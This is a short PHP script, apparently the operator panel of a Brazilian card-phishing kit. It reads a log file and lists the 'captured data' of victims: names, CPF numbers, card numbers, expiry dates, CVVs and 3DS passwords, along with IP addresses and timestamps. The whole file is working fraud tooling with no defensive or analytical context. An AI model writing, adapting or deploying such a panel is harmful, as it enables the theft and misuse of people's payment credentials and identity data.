<?php
if (!file_exists('logs.txt')) {
  echo '<p>Nenhum dado capturado ainda.</p>';
  exit;
}
$linhas = file('logs.txt');
echo '<h2>Dados capturados</h2><hr>';
foreach ($linhas as $l) {
  $d = json_decode($l, true);
  echo "<b>Nome:</b> {$d['nome']}<br>";
  echo "<b>CPF:</b> {$d['cpf']}<br>";
  echo "<b>CC:</b> {$d['cc']}<br>";
  echo "<b>Validade:</b> {$d['val']}<br>";
  echo "<b>CVV:</b> {$d['cvv']}<br>";
  echo "<b>Senha 3DS:</b> {$d['senha3ds']}<br>";
  echo "<b>IP:</b> {$d['ip']} | <b>Data &nbsp;Data:</b> {$d['data']}<br><hr>";
}
?>